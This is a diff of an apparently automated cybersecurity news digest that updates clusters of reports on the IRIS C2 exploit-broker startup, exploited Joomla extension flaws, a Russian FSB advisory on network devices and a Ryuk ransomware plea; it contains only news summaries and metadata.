-A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
-```
-
-#### Full body
-
-```
-A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names. The X/Twitter account IRIS C2 (@C2IRIS) has gained more than 4,000 followers since its creation in January 2025, posting frequently about security vulnerabilities, AI and software exploits. IRIS C2 says it is a company in McLean, Va. that sells offensive cybersecurity capabilities. The IRIS C2 website dangles the possibility of million-dollar payouts for exploits to attract talent. “Our business model is this,” reads a pinned post on top of the IRIS C2 account on X. “Attract the very best vulnerability researchers and exploit developers in the world to join our company. This mostly revolves around junior engineers with raw talent/extremely high IQ. We don’t care if they have a college degree/industry experience.” The website linked in that profile — irisc2[.]com — says the company is hiring for a number of open positions, and a recent post on its LinkedIn page enthuses about an overwhelming number of applications from potential employees. The website claims IRIS C2 is in the business of acquiring “zero-day exploits, individual primitives, partial chains, and full capabilities across all major platforms. Payouts range from $10,000 to $7 million depending on target, reliability, and operational value.” The government contracting portal g2exchange.com reports that irisc2[.]com is operated by a business based in Virginia called Calvexa Group LLC . The “contact” link on the website for Calvexa Group — calvexagroup[.]com — forwards visitors to irisc2[.]com. G2Exchange shows that while Calvexa Group LLC is registered as a federal contractor, it does not appear to be working on any direct government contracts. A search on the Arlington, Va. address listed in the incorporation records for Calvexa Group LLC finds the property is occupied by Jack Burkman , the 60-year-old founder and managing partner of the lobbying firm Burkman & Associates . When approached with questions about IRIS C2, Burkman referred further inquiries to his longtime associate, 28-year-old Jacob Wohl . Jack Burkman (left) and Jacob Wohl, at a press conference in August 2020. Image: Wikipedia. Burkman and Wohl have a storied history of creating fake intelligence companies and using them to spread false claims about and frame public figures, including fabricated sexual assault claims against then FBI director Robert Mueller , and Pete Buttigieg , then mayor of South Bend, Indiana and a Democratic candidate for the presidency. In 2019, Burkman and Wohl held press conferences falsely alleging extramarital affairs by Sen. Elizabeth Warren (D-Mass.) and then-2020 presidential candidate Kamala Harris . In the wake of the 2020 presidential election, Wohl and Burkman were prosecuted by multiple U.S. states for making thousands of robocalls to residents of battleground states and disseminating false claims about mail-in ballots. They were indicted in Cleveland on 15 felony counts of orchestrating a robocall scheme aimed at suppressing the black vote in Detroit, and were sentenced in late 2025 to probation after their appeals to dismiss the charges were rejected. In 2022, Wohl and Burkman both pleaded guilty to a single felony charge of telecommunications fraud in Ohio, and sentenced to a fine, probation, and community service. In March 2023, a judge in a New York civil case ruled that Wohl and Burkman had violated federal and state civil rights laws, and the two agreed to pay a $1 million settlement. In June 2023, the Federal Communications Commission (FCC) imposed a $5.1 million fine against Wohl and Burkman for their robocall campaigns, at the time the largest fine ever sought by the FCC under the Telephone Consumer Protection Act. Jacob “Jay” Wo
-```
-
-#### Corroborating sources (1)
-
-- **Krebs on Security** (practitioner_analysis)
-  - Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
-  - Published: 2026-07-08T12:31:39+00:00
-  - Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
-  - Summary: A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
 
 ### Cluster aa4a893323 — score 10
 
@@ -2407,6 +2311,51 @@ Unpatched XRING Flaw in XQUIC Lets Remote Clients Crash HTTP/3 Servers  Swati
   - Published: 2026-07-10T11:47:43+00:00
   - Link: https://thehackernews.com/2026/07/unpatched-xring-flaw-in-xquic-lets.html
   - Summary: A single wrong variable on one line in XQUIC, Alibaba's QUIC and HTTP/3 library, lets any remote client crash the server with a short burst of completely legal traffic. There is no patch. FoxIO researcher Sébastien Féry disclosed the flaw on July 8 and nicknamed it XRING. He says it needs no login and no malformed packets: about 260 bytes of ordinary QPACK traffic takes the server
+
+### Cluster ce7170bd38 — score 10
+
+- Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
+- Source: Krebs on Security (practitioner_analysis)
+- Published: 2026-07-08T12:31:39+00:00
+- Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: zero_day
+- affected_industries: education, government, telecommunications
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_3_analysis
+
+#### Primary article taxonomy
+- threat_categories: zero_day
+- affected_industries: government, telecommunications, education
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_3_analysis
+
+#### Summary
+
+```
+A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
+```
+
+#### Full body
+
+```
+A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names. The X/Twitter account IRIS C2 (@C2IRIS) has gained more than 4,000 followers since its creation in January 2025, posting frequently about security vulnerabilities, AI and software exploits. IRIS C2 says it is a company in McLean, Va. that sells offensive cybersecurity capabilities. The IRIS C2 website dangles the possibility of million-dollar payouts for exploits to attract talent. “Our business model is this,” reads a pinned post on top of the IRIS C2 account on X. “Attract the very best vulnerability researchers and exploit developers in the world to join our company. This mostly revolves around junior engineers with raw talent/extremely high IQ. We don’t care if they have a college degree/industry experience.” The website linked in that profile — irisc2[.]com — says the company is hiring for a number of open positions, and a recent post on its LinkedIn page enthuses about an overwhelming number of applications from potential employees. The website claims IRIS C2 is in the business of acquiring “zero-day exploits, individual primitives, partial chains, and full capabilities across all major platforms. Payouts range from $10,000 to $7 million depending on target, reliability, and operational value.” The government contracting portal g2exchange.com reports that irisc2[.]com is operated by a business based in Virginia called Calvexa Group LLC . The “contact” link on the website for Calvexa Group — calvexagroup[.]com — forwards visitors to irisc2[.]com. G2Exchange shows that while Calvexa Group LLC is registered as a federal contractor, it does not appear to be working on any direct government contracts. A search on the Arlington, Va. address listed in the incorporation records for Calvexa Group LLC finds the property is occupied by Jack Burkman , the 60-year-old founder and managing partner of the lobbying firm Burkman & Associates . When approached with questions about IRIS C2, Burkman referred further inquiries to his longtime associate, 28-year-old Jacob Wohl . Jack Burkman (left) and Jacob Wohl, at a press conference in August 2020. Image: Wikipedia. Burkman and Wohl have a storied history of creating fake intelligence companies and using them to spread false claims about and frame public figures, including fabricated sexual assault claims against then FBI director Robert Mueller , and Pete Buttigieg , then mayor of South Bend, Indiana and a Democratic candidate for the presidency. In 2019, Burkman and Wohl held press conferences falsely alleging extramarital affairs by Sen. Elizabeth Warren (D-Mass.) and then-2020 presidential candidate Kamala Harris . In the wake of the 2020 presidential election, Wohl and Burkman were prosecuted by multiple U.S. states for making thousands of robocalls to residents of battleground states and disseminating false claims about mail-in ballots. They were indicted in Cleveland on 15 felony counts of orchestrating a robocall scheme aimed at suppressing the black vote in Detroit, and were sentenced in late 2025 to probation after their appeals to dismiss the charges were rejected. In 2022, Wohl and Burkman both pleaded guilty to a single felony charge of telecommunications fraud in Ohio, and sentenced to a fine, probation, and community service. In March 2023, a judge in a New York civil case ruled that Wohl and Burkman had violated federal and state civil rights laws, and the two agreed to pay a $1 million settlement. In June 2023, the Federal Communications Commission (FCC) imposed a $5.1 million fine against Wohl and Burkman for their robocall campaigns, at the time the largest fine ever sought by the FCC under the Telephone Consumer Protection Act. Jacob “Jay” Wo
+```
+
+#### Corroborating sources (1)
+
+- **Krebs on Security** (practitioner_analysis)
+  - Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
+  - Published: 2026-07-08T12:31:39+00:00
+  - Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
+  - Summary: A cybersecurity startup dangling millions of dollars to acquire zero-day security vulnerabilities in popular software is run by a pair of far-right conspiracy theorists and convicted felons whose most recent ventures included fake intelligence companies and a now-defunct AI-based lobbying platform they operated under assumed names.
 
 ### Cluster cdaff85c13 — score 10
 
@@ -2647,55 +2596,6 @@ Public Sector Key findings from the 2026 Public Sector M-Trends report and beyon
   - Link: https://cloud.google.com/blog/topics/public-sector/key-findings-from-the-2026-public-sector-m-trends-report-and-beyond/
   - Summary: In 2026, the public sector is no longer defending a traditional perimeter. Instead, they are defending a complex web of interconnected trust relationships against adversaries that now operate at machine speed. We recently published the 2026 Public Sector Threat Landscape: M-Trends and Beyond report, which distills more than 500,000 hours of frontline incident investigations conducted by Mandiant in 2025, specifically tailored to the mission-critical needs of public sector leaders. Key findings from the report and what they mean for the public sector The most alarming trend in this year’s M-Trends data is the 22-second hand-off: the median time between an initial access broker establishing a foothold and the hand-off to a ransomware operator. This extreme compression of the attack cycle renders traditional, human-speed triage obsolete. When an infection on a municipal workstation can move to an encrypted network before a human analyst can even open a ticket, the strategic mandate for re
 
-### Cluster b5c5a1216b — score 9
-
-- Title: Organizations Warned of Exploited Joomla Extension Vulnerabilities
-- Source: SecurityWeek (cyber_news_breach_reporting)
-- Published: 2026-07-13T09:08:02+00:00
-- Link: https://www.securityweek.com/organizations-warned-of-exploited-joomla-extension-vulnerabilities/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, data_breach, phishing_social_eng, ransomware_extortion, zero_day
-- affected_industries: education, government
-- affected_products: Microsoft 365, Okta, Palo Alto Networks
-- cve_ids: CVE-2026-48939, CVE-2026-56291
-- urgency_signals: actively_exploited, preauth_unauth, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach, active_exploitation
-- affected_industries: government, education
-- affected_products: Palo Alto Networks, Okta, Microsoft 365
-- cve_ids: CVE-2026-56291, CVE-2026-48939
-- urgency_signals: actively_exploited, zero_day, preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Threat actors have been targeting Balbooa Forms and iCagenda Joomla extension flaws for remote code execution. The post Organizations Warned of Exploited Joomla Extension Vulnerabilities appeared first on SecurityWeek .
-```
-
-#### Full body
-
-```
-Threat actors have been exploiting critical vulnerabilities in the Balbooa Forms and iCagenda Joomla extensions that allow unauthenticated attackers to achieve remote code execution (RCE). The Balbooa flaw, tracked as CVE-2026-56291 (CVSS score of 10), is described as an unauthenticated arbitrary file upload issue affecting the extension’s frontend attachment upload endpoint. Balbooa Forms version 2.4.1 was released on July 9 with patches for the bug, but threat actors were observed exploiting it in the wild as a zero-day. The security defect impacts all websites running Balbooa Forms version 2.4.0 or earlier, and the active exploitation prompts immediate action from site administrators. In June, the iCagenda extension for Joomla was found to be affected by a similar arbitrary file upload vulnerability in the file attachment feature, tracked as CVE-2026-48939 (CVSS score of 10). As with the Balbooa bug, the iCagenda flaw allows attackers to upload PHP code to a vulnerable deployment and achieve RCE without authentication. Advertisement. Scroll to continue reading. JoomliC, iCagenda’s developer, reportedly observed the CVE being exploited in the wild as a zero-day on June 15. The developer rolled out patches in iCagenda versions 4.0.8 and 3.9.15 on June 15-16. On July 10, the US cybersecurity agency CISA added both Joomla extension security defects to its Known Exploited Vulnerabilities ( KEV ) catalog, urging federal agencies to patch them within three days, in line with BOD 26-04 guidance. While BOD 26-04 applies only to federal agencies, all organizations are advised to review CISA’s KEV list and address the vulnerabilities it identifies as soon as possible. Related: Palo Alto Networks Patches 13 Vulnerabilities Related: 15-Year-Old Linux Vulnerability ‘GhostLock’ Earns Researchers $92k From Google Related: Microsoft Patches Defender ‘RoguePlanet’ Vulnerability Related: Chrome 150 Update Patches 27 Vulnerabilities Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Okta Warns of Vishing Attacks Targeting Microsoft 365 Customers GigaWiper Combines Multiple Malware for System-Level Sabotage Network of 200 GitHub Repositories Used for Malware Infection 12 Million Impacted by Data Breach at Japanese Telco KDDI 15-Year-Old Linux Vulnerability ‘GhostLock’ Earns Researchers $92k From Google Mount Royal University Confirms Data Stolen in Ransomware Attack Chrome 150 Update Patches 27 Vulnerabilities 8Layers Raises $2.9 Million for Identity Security Platform Latest News Hacker Conversations: Jesse McGraw (GhostExodus), From Blackhat Hacker to Redemption Cybersecurity M&A Roundup: 37 Deals Announced in June 2026 RabbitMQ Vulnerability Threatens Enterprise Systems Zimbra Patches Critical Code Execution Vulnerability EU Targets Russian Intelligence Officers Accused of Running a Yearslong Cyber Spying Campaign Progress Prompts ShareFile Storage Zone Controller Shutdown Amid Security Concerns Centers Laboratory Data Breach Affects 540,000 Individuals Ghost Accounts Abuse GitHub API in Mass Recon Campaign Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Why Email Security Keeps Failing (And What Has to Change) July 8, 2026 Join this live webinar as we break down why email-layer defenses alone can't keep pace with the modern phishing ecosystem, how agentic AI is changing the capacity equation for security teams, and more. Register Virtual Event: 2026 Cloud Security Summit July 16, 2026 This year's summit will help organizations learn how to utilize tools, controls, and design models needed to properly secure cloud environments. Interact with leading solution providers and other end users f
-```
-
-#### Corroborating sources (1)
-
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - Title: Organizations Warned of Exploited Joomla Extension Vulnerabilities
-  - Published: 2026-07-13T09:08:02+00:00
-  - Link: https://www.securityweek.com/organizations-warned-of-exploited-joomla-extension-vulnerabilities/
-  - Summary: Threat actors have been targeting Balbooa Forms and iCagenda Joomla extension flaws for remote code execution. The post Organizations Warned of Exploited Joomla Extension Vulnerabilities appeared first on SecurityWeek .
-
 ### Cluster c06f0c2fb1 — score 9
 
 - Title: Centers Laboratory Data Breach Affects 540,000 Individuals
@@ -2822,41 +2722,6 @@ Graham Cluley @ 12:19 am, July 9, 2026 @grahamcluley.com / grahamcluley A 15-yea
   - Published: 2026-07-08T23:19:18+00:00
   - Link: https://grahamcluley.com/smashing-security-podcast-475/
   - Summary: A 15-year-old boy asked a chatbot for help - and cancelled nearly 47,000 anime streaming subscriptions in under four hours. Meanwhile, researchers have documented the first fully autonomous, agentic AI-driven ransomware attack, "JadePuffer". What does this tell us about the future of cybersecurity? Also, Apple's "Hide My Email" feature turns out to hide rather less than it promises - despite Apple knowing it has a problem for over a year. All this and more in this episode of the "Smashing Security" podcast with cybersecurity expert and keynote speaker Graham Cluley, and special guest Zoë Rose.
-
-### Cluster 6a5a22a81b — score 9
-
-- Title: Dell BIOS Passwords: Weak XOR Encryption Allows Recovery from SPI Flash (CVE-2026-40639)
-- Source: Reddit r/netsec (reddit_practitioner_osint)
-- Published: 2026-07-13T09:33:49+00:00
-- Link: https://www.reddit.com/r/netsec/comments/1uv6qbn/dell_bios_passwords_weak_xor_encryption_allows/
-- Fetch status: fetch_failed:HTTPError
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: CVE-2026-40639
-
-#### Cluster taxonomy (union across members)
-- cve_ids: CVE-2026-40639
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_5_chatter
-
-#### Primary article taxonomy
-- cve_ids: CVE-2026-40639
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_5_chatter
-
-#### Summary
-
-```
-submitted by /u/sajkoterrapefft [link] [comments]
-```
-
-#### Corroborating sources (1)
-
-- **Reddit r/netsec** (reddit_practitioner_osint)
-  - Title: Dell BIOS Passwords: Weak XOR Encryption Allows Recovery from SPI Flash (CVE-2026-40639)
-  - Published: 2026-07-13T09:33:49+00:00
-  - Link: https://www.reddit.com/r/netsec/comments/1uv6qbn/dell_bios_passwords_weak_xor_encryption_allows/
-  - Summary: submitted by /u/sajkoterrapefft [link] [comments]
 
 ### Cluster 8ca1179b44 — score 9
 
@@ -3209,6 +3074,55 @@ Home Blog Meta Phishers Abuse Business Account Manager Service Published: July 7
   - Link: https://www.huntress.com/blog/meta-business-manager-phishing
   - Summary: Huntress is tracking a threat actor group as they evolve a phishing attack that uses a Facebook feature to send the initial spam lure.
 
+### Cluster b5c5a1216b — score 8
+
+- Title: Organizations Warned of Exploited Joomla Extension Vulnerabilities
+- Source: SecurityWeek (cyber_news_breach_reporting)
+- Published: 2026-07-13T09:08:02+00:00
+- Link: https://www.securityweek.com/organizations-warned-of-exploited-joomla-extension-vulnerabilities/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, data_breach, phishing_social_eng, ransomware_extortion, zero_day
+- affected_industries: education, government
+- affected_products: Microsoft 365, Okta, Palo Alto Networks
+- cve_ids: CVE-2026-48939, CVE-2026-56291
+- urgency_signals: actively_exploited, preauth_unauth, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach, active_exploitation
+- affected_industries: government, education
+- affected_products: Palo Alto Networks, Okta, Microsoft 365
+- cve_ids: CVE-2026-56291, CVE-2026-48939
+- urgency_signals: actively_exploited, zero_day, preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Threat actors have been targeting Balbooa Forms and iCagenda Joomla extension flaws for remote code execution. The post Organizations Warned of Exploited Joomla Extension Vulnerabilities appeared first on SecurityWeek .
+```
+
+#### Full body
+
+```
+Threat actors have been exploiting critical vulnerabilities in the Balbooa Forms and iCagenda Joomla extensions that allow unauthenticated attackers to achieve remote code execution (RCE). The Balbooa flaw, tracked as CVE-2026-56291 (CVSS score of 10), is described as an unauthenticated arbitrary file upload issue affecting the extension’s frontend attachment upload endpoint. Balbooa Forms version 2.4.1 was released on July 9 with patches for the bug, but threat actors were observed exploiting it in the wild as a zero-day. The security defect impacts all websites running Balbooa Forms version 2.4.0 or earlier, and the active exploitation prompts immediate action from site administrators. In June, the iCagenda extension for Joomla was found to be affected by a similar arbitrary file upload vulnerability in the file attachment feature, tracked as CVE-2026-48939 (CVSS score of 10). As with the Balbooa bug, the iCagenda flaw allows attackers to upload PHP code to a vulnerable deployment and achieve RCE without authentication. Advertisement. Scroll to continue reading. JoomliC, iCagenda’s developer, reportedly observed the CVE being exploited in the wild as a zero-day on June 15. The developer rolled out patches in iCagenda versions 4.0.8 and 3.9.15 on June 15-16. On July 10, the US cybersecurity agency CISA added both Joomla extension security defects to its Known Exploited Vulnerabilities ( KEV ) catalog, urging federal agencies to patch them within three days, in line with BOD 26-04 guidance. While BOD 26-04 applies only to federal agencies, all organizations are advised to review CISA’s KEV list and address the vulnerabilities it identifies as soon as possible. Related: Palo Alto Networks Patches 13 Vulnerabilities Related: 15-Year-Old Linux Vulnerability ‘GhostLock’ Earns Researchers $92k From Google Related: Microsoft Patches Defender ‘RoguePlanet’ Vulnerability Related: Chrome 150 Update Patches 27 Vulnerabilities Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Okta Warns of Vishing Attacks Targeting Microsoft 365 Customers GigaWiper Combines Multiple Malware for System-Level Sabotage Network of 200 GitHub Repositories Used for Malware Infection 12 Million Impacted by Data Breach at Japanese Telco KDDI 15-Year-Old Linux Vulnerability ‘GhostLock’ Earns Researchers $92k From Google Mount Royal University Confirms Data Stolen in Ransomware Attack Chrome 150 Update Patches 27 Vulnerabilities 8Layers Raises $2.9 Million for Identity Security Platform Latest News Hacker Conversations: Jesse McGraw (GhostExodus), From Blackhat Hacker to Redemption Cybersecurity M&A Roundup: 37 Deals Announced in June 2026 RabbitMQ Vulnerability Threatens Enterprise Systems Zimbra Patches Critical Code Execution Vulnerability EU Targets Russian Intelligence Officers Accused of Running a Yearslong Cyber Spying Campaign Progress Prompts ShareFile Storage Zone Controller Shutdown Amid Security Concerns Centers Laboratory Data Breach Affects 540,000 Individuals Ghost Accounts Abuse GitHub API in Mass Recon Campaign Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Why Email Security Keeps Failing (And What Has to Change) July 8, 2026 Join this live webinar as we break down why email-layer defenses alone can't keep pace with the modern phishing ecosystem, how agentic AI is changing the capacity equation for security teams, and more. Register Virtual Event: 2026 Cloud Security Summit July 16, 2026 This year's summit will help organizations learn how to utilize tools, controls, and design models needed to properly secure cloud environments. Interact with leading solution providers and other end users f
+```
+
+#### Corroborating sources (1)
+
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - Title: Organizations Warned of Exploited Joomla Extension Vulnerabilities
+  - Published: 2026-07-13T09:08:02+00:00
+  - Link: https://www.securityweek.com/organizations-warned-of-exploited-joomla-extension-vulnerabilities/
+  - Summary: Threat actors have been targeting Balbooa Forms and iCagenda Joomla extension flaws for remote code execution. The post Organizations Warned of Exploited Joomla Extension Vulnerabilities appeared first on SecurityWeek .
+
 ### Cluster 2d0e3438a3 — score 8
 
 - Title: Officials once again warn defenders that Russian hackers are targeting network devices
@@ -3243,7 +3157,7 @@ State-sponsored attackers are targeting critical infrastructure networks in defe
 #### Full body
 
 ```
-Advertisement Subscribe to our daily newsletter. Subscribe Close Russian state-sponsored hackers are breaking into critical infrastructure around the world by exploiting poorly configured and vulnerable networking devices, authorities from the United States and 12 additional countries said in a joint cybersecurity advisory Monday. Officials once again urged defenders to take more preventative measures to thwart attacks from the Russian Federal Security Service Center 16, which has been actively targeting critical infrastructure for more than a decade. The hackers are also tracked as Berserk Bear, Energetic Bear, Crouching Yeti, Dragonfly, Ghost Blizzard and Static Tundra. “This is an ongoing issue that has impacted various U.S. and foreign networks across multiple sectors, including the defense industrial base, communications, energy, financial services, government facilities and health care sectors,” the National Security Agency said in a statement . The state-sponsored attackers scan the internet for vulnerable routers using default or weak passwords, and have also exploited vulnerabilities in Cisco devices, Cisco’s Smart Install feature and web portals to take over network devices. Advertisement Two of the Cisco vulnerabilities exploited by the Russian FSB Center 16 hackers are quite old, including CVE-2008-4128 and CVE-2018-0171 . Officials shared technical details of the threat group’s activities and advised network defenders to disable Cisco Smart Install on all devices, use stronger modes of authentication and passwords, monitor for unusual credentials and logins using local accounts. The joint advisory comes nearly a year after the FBI issued a similar alert about the same group targeting end-of-life networking devices running Cisco Smart Install. On Monday, the European Union blamed Russia’s FSB Center 16 for a December 2025 attack on Poland’s energy grid. The United Kingdom, also on Monday, sanctioned 24 individuals and entities allegedly involved in various attacks attributed to Russian intelligence services. “From directing criminals to targeting businesses, and striking Poland’s energy grid in the depths of winter, the Russian state is sinking to new lows in its attempts to undermine European security,” Yvette Cooper, foreign security of the United Kingdom, said in a statement. Advertisement Other countries behind the joint cybersecurity advisory include: Canada, Australia, New Zealand, Czech Republic, Denmark, Estonia, Finland, France, Italy, Poland and Sweden. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Advertisement More Scoops (Getty Images) (Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government CISA looks to remedy ailments from big May credential leak French nonprofit starts global intelligence and research hub for AI cyber threats US Army websites defaced with pro-Kurdish sentiments, insults to Trump Someone infected a spyware probe overseer with spyware Technology Deepfake CSAM lawsuit against xAI, Grok expands US lifting export control restrictions on Anthropic’s Mythos, Fable Supreme Court delivers ‘major win’ for tech privacy in Chatrie ruling What the post-quantum executive order really demands of CISOs Threats Former DigitalMint ransomware negotiator who duped clients sentenced to 70 months in jail Interpol cybercrime crackdown nets 5,800 arrests across 97 countries 764 splinter group leader sentenced to 40 years in jail Spain arrests suspected hacker linked to Russian hacktivist campaign Policy Trump budget boss Russell Vought open to re-staffing CISA DHS to unveil replacement council for critical infrastructure cybersecurity Warner bill would create federally vetted list for secure, trustworthy AI agents Supreme Co
+Advertisement Subscribe to our daily newsletter. Subscribe Close Russian state-sponsored hackers are breaking into critical infrastructure around the world by exploiting poorly configured and vulnerable networking devices, authorities from the United States and 12 additional countries said in a joint cybersecurity advisory Monday. Officials once again urged defenders to take more preventative measures to thwart attacks from the Russian Federal Security Service Center 16, which has been actively targeting critical infrastructure for more than a decade. The hackers are also tracked as Berserk Bear, Energetic Bear, Crouching Yeti, Dragonfly, Ghost Blizzard and Static Tundra. “This is an ongoing issue that has impacted various U.S. and foreign networks across multiple sectors, including the defense industrial base, communications, energy, financial services, government facilities and health care sectors,” the National Security Agency said in a statement . The state-sponsored attackers scan the internet for vulnerable routers using default or weak passwords, and have also exploited vulnerabilities in Cisco devices, Cisco’s Smart Install feature and web portals to take over network devices. Advertisement Two of the Cisco vulnerabilities exploited by the Russian FSB Center 16 hackers are quite old, including CVE-2008-4128 and CVE-2018-0171 . Officials shared technical details of the threat group’s activities and advised network defenders to disable Cisco Smart Install on all devices, use stronger modes of authentication and passwords, monitor for unusual credentials and logins using local accounts. The joint advisory comes nearly a year after the FBI issued a similar alert about the same group targeting end-of-life networking devices running Cisco Smart Install. On Monday, the European Union blamed Russia’s FSB Center 16 for a December 2025 attack on Poland’s energy grid. The United Kingdom, also on Monday, sanctioned 24 individuals and entities allegedly involved in various attacks attributed to Russian intelligence services. “From directing criminals to targeting businesses, and striking Poland’s energy grid in the depths of winter, the Russian state is sinking to new lows in its attempts to undermine European security,” Yvette Cooper, foreign security of the United Kingdom, said in a statement. Advertisement Other countries behind the joint cybersecurity advisory include: Canada, Australia, New Zealand, Czech Republic, Denmark, Estonia, Finland, France, Italy, Poland and Sweden. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops (Getty Images) (Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government CISA looks to remedy ailments from big May credential leak French nonprofit starts global intelligence and research hub for AI cyber threats US Army websites defaced with pro-Kurdish sentiments, insults to Trump Someone infected a spyware probe overseer with spyware Technology Deepfake CSAM lawsuit against xAI, Grok expands US lifting export control restrictions on Anthropic’s Mythos, Fable Supreme Court delivers ‘major win’ for tech privacy in Chatrie ruling What the post-quantum executive order really demands of CISOs Threats Former DigitalMint ransomware negotiator who duped clients sentenced to 70 months in jail Interpol cybercrime crackdown nets 5,800 arrests across 97 countries 764 splinter group leader sentenced to 40 years in jail Spain arrests suspected hacker linked to Russian hacktivist campaign Policy Trump budget boss Russell Vought open to re-staffing CISA DHS to unveil replacement council for critical infrastructure cybersecurity Warner bill would create federally vetted list for secure, trustworthy AI agent
 ```
 
 #### Corroborating sources (1)
@@ -3288,7 +3202,7 @@ Karen Vardanyan faces up to 15 years in federal prison and agreed to pay nearly 
 #### Full body
 
 ```
-Advertisement Subscribe to our daily newsletter. Subscribe Close An Armenian national who was extradited from Ukraine to the United States last year pleaded guilty to participating in a series of attacks in 2019 and 2020 involving Ryuk ransomware, the Justice Department said Thursday. Karen Serobovich Vardanyan pleaded guilty to computer fraud and conspiracy to commit fraud and extortion. He agreed to pay nearly $1.2 million million in restitution and faces up to 15 years in jail. The 34-year-old admitted to participating in cybercrime from November 2019 to April 2020 when he and his co-conspirators deployed Ryuk ransomware against three U.S.-based organizations while living in Ukraine and Russia. Vardanyan’s victims include a Michigan-based company that paid a ransom of nearly $1.2 million in January 2020, a Watsonville, Oregon-based technology company that was attacked in December 2019 and a Texas-based school breached in February 2020. Advertisement Prosecutors previously accused Vardanyan and his co-conspirators — Ukrainian nationals Oleg Nikolayevich Lyulyava and Andrii Leonydovich Prykhodchenko, and Armenian national Levon Georgiyovych Avetisyan — of illegally accessing computer networks to deploy Ryuk ransomware on hundreds of compromised servers and workstations between March 2019 and September 2020. Ryuk ransomware was prevalent in 2019 and 2020, infecting thousands of victims globally across the private sector, state and local municipalities, local school districts and critical infrastructure, including a wave of attacks on U.S. hospitals. Victims of Ryuk ransomware attacks include Hollywood Presbyterian Medical Center , Universal Health Services , Electronic Warfare Associates , a North Carolina water utility and multiple U.S. newspapers. Ryuk ransomware operators extorted victim companies by demanding ransom payments in Bitcoin in exchange for decryption keys. Justice Department officials said Vardanyan and his co-conspirators received about 1,160 bitcoins — valued at more than $15 million at the time — in ransom payments from victim companies. Vardanyan, as part of his guilty plea, also acknowledged that his conviction will have immigration consequences resulting in removal from the United States after serving his sentence. Advertisement The U.S. District Court for the District of Oregon has yet to schedule his sentencing. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops The Department of Justice building is seen in Washington, DC, on August 9, 2022. (Photo by Stefani Reynolds / AFP) (Photo by STEFANI REYNOLDS/AFP via Getty Images) Gwengoat, iStock/Getty Images Plus (Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government CISA looks to remedy ailments from big May credential leak French nonprofit starts global intelligence and research hub for AI cyber threats US Army websites defaced with pro-Kurdish sentiments, insults to Trump Someone infected a spyware probe overseer with spyware Technology Deepfake CSAM lawsuit against xAI, Grok 